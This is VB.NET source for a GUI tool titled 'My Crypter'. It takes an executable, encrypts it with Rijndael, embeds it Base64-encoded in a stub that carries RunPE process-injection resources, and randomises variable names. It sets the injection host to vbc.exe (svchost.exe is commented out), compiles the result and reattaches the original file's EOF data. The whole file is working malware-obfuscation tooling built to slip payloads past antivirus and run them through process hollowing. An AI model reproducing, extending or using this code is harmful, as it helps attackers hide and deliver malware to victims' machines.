Imports System.CodeDom.Compiler
Imports System.Security.Cryptography
Imports System.IO
Imports System.Resources
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Reflection

Public Class Form1
    Dim open As New OpenFileDialog
    Dim save As New SaveFileDialog
    Dim EOF As String
    Public Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String
        Dim lPos As Integer
        If Dir(FilePath) = "" Then
            Exit Function
        End If
        Dim ReadFile As String = IO.File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        ReadEOFData = StrReverse(EOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function

    Public Shared Function format(ByVal input As String) As String
        Dim RandomClass As New Random()
        Dim out As New System.Text.StringBuilder
        Dim base64data As String = input
        Dim arr As String() = SplitString(base64data, 60000)
        For i As Integer = 0 To arr.Length - 1
            'out.Append(arr(i))
            If i = arr.Length - 1 Then
                out.Append(Chr(34) & arr(i) & Chr(34) & vbNewLine)
            ElseIf i = 0 Then
                out.Append(Chr(34) & arr(i) & Chr(34) & vbNewLine & "%Value% = " & Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            ElseIf i < arr.Length - 1 Then
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        'File.WriteAllText("gh.txt", out.ToString)
        Return out.ToString

    End Function

    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize)
        Dim out(amount - 1) As String
        Dim currentpos As Long = 0
        For I As Integer = 0 To amount - 1
            If I = amount - 1 Then
                Dim dusk((input.Length - currentpos) - 1) As Char
                input.CopyTo(currentpos, dusk, 0, (input.Length - currentpos))
                out(I) = Convert.ToString(dusk)
            Else
                Dim dusk(partsize - 1) As Char
                input.CopyTo(currentpos, dusk, 0, partsize)
                out(I) = Convert.ToString(dusk)
                currentpos += partsize
            End If
        Next
        Return out
    End Function

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        With open
            .Title = "Selecy your File"
            .Filter = "Executable File (*.exe)|*.exe"
            If .ShowDialog = DialogResult.OK Then
                TextBox1.Text = open.FileName
            End If
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        crypt()
    End Sub

    Public Sub crypt()
        Dim p As New CompilerParameters
        Dim Prov = New Collections.Generic.Dictionary(Of String, String)
        Prov.Add("CompilerVersion", "v2.0")
        p.GenerateExecutable = True
        p.TreatWarningsAsErrors = False
        p.CompilerOptions = "/optimize+ /platform:x86 /t:winexe"
        p.IncludeDebugInformation = False
        save.Title = "Where you want to save the file?"
        save.Filter = "Executable File (*.exe)|*.exe"
        If save.ShowDialog = DialogResult.OK Then
            Dim s As String = My.Resources.Source
            Dim b As Byte()
            Using FSRead As FileStream = New FileStream(open.FileName, FileMode.Open, FileAccess.Read)
                b = New Byte((FSRead.Length) - 1) {}
                Dim NumBytestoRead As Integer = CType(FSRead.Length, Integer)
                Dim NumBytesRead As Integer = 0
                While (NumBytestoRead > 0)
                    Dim n As Integer = FSRead.Read(b, NumBytesRead, NumBytestoRead)
                    If (n = 0) Then Exit While
                    NumBytesRead += n
                    NumBytestoRead -= n
                End While
                NumBytestoRead = b.Length
            End Using
            
            Dim key As String = GenerateRandomString(20)
            Label1.Text = key
            b = RijndaelEncrypt(b, key)
            Dim bs As String = Convert.ToBase64String(b)
            bs = format(bs)
            s = s.Replace("#Pack", bs)
            EOF = ReadEOFData(open.FileName)
            s = s.Replace("{KEY}", key)
            s = s.Replace("#runpe", My.Resources.Insider)
            s = s.Replace("#inside", My.Resources.IRunner)
            s = s.Replace("{PATH}", "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe")
            's = s.Replace("{PATH}", "C:\Windows\System32\svchost.exe")
            Dim percentdelims As New List(Of String)
            Dim matchespercentdelims As RegularExpressions.MatchCollection = RegularExpressions.Regex.Matches(s, "%(.*?)%")
            For Each m As RegularExpressions.Match In matchespercentdelims
                For Each c As RegularExpressions.Capture In m.Captures
                    percentdelims.Add(c.ToString())
                Next
            Next
            For Each varname As String In percentdelims
                Dim rnd1 As String = GenerateRandomString(22)
                Dim rnd2 As String = GenerateRandomString(22)
                s = s.Replace(varname, rnd2)
            Next
            'Dim res As New ResourceWriter("my.resources")
            'res.AddResource("hash", b)
            'res.Close()
            'p.EmbeddedResources.Add("my.resources")
            p.OutputAssembly = save.FileName
            For Each assem As Assembly In AppDomain.CurrentDomain.GetAssemblies
                p.ReferencedAssemblies.Add([assem].Location)
            Next
            Dim r As CompilerResults = New VBCodeProvider(Prov).CompileAssemblyFromSource(p, s)
            File.WriteAllText("CounterCheck.txt", s)
            If CheckBox1.Checked Then
                File.AppendAllText(save.FileName, EOF)
            End If
            'WriteResource(save.FileName, b)
            'Dim d As Integer = 0
            'Dim se As Integer = 23 / d
            If r.Errors.Count > 1 Then
                Dim ermsg As String = Nothing
                For Each err As CodeDom.Compiler.CompilerError In r.Errors
                    ermsg += err.ToString + vbNewLine + vbNewLine
                Next
                MsgBox(ermsg, vbCritical, "My Crypter.")
            Else
                MsgBox("File crypted", vbInformation, "My Crypter.")
            End If
            'File.Delete("my.resources")
        End If
    End Sub

    Public Function GenerateRandomString(ByRef Length As String) As String
        Dim AC As String
        GenerateRandomString = Nothing
        AC = "qwertyuiopasdfghjklzxcvbnm"
        For i As Integer = 1 To Length
            GenerateRandomString += Mid(AC, Int(Rnd() * Len(AC) + 1), 1)
        Next
        Return GenerateRandomString
    End Function

    Public Function GenerateRandomInt(ByRef Length As String) As Integer
        Dim AC As String
        GenerateRandomInt = 0
        AC = "1234567890"
        For i As Integer = 1 To Length
            GenerateRandomInt += Mid(AC, Int(Rnd() * Len(AC) + 1), 1)
        Next
        Return GenerateRandomInt
    End Function

    Public Shared Function RijndaelEncrypt(ByVal bytes As Byte(), ByVal Key As String) As Byte()
        Dim memoryStream As MemoryStream
        Dim cryptoStream As CryptoStream
        Dim rijndael__1 As Rijndael = Rijndael.Create()
        Dim pdb As New Rfc2898DeriveBytes(Key, New Byte() {&H26, &HDC, &HFF, &H0, &HAD, &HED, _
         &H7A, &HEE, &HC5, &HFE, &H7, &HAF, _
         &H4D, &H8, &H22, &H3C})
        rijndael__1.Key = pdb.GetBytes(32)
        rijndael__1.IV = pdb.GetBytes(16)
        memoryStream = New MemoryStream()
        cryptoStream = New CryptoStream(memoryStream, rijndael__1.CreateEncryptor(), CryptoStreamMode.Write)
        cryptoStream.Write(bytes, 0, bytes.Length)
        cryptoStream.Close()
        Return memoryStream.ToArray()
    End Function

End Class




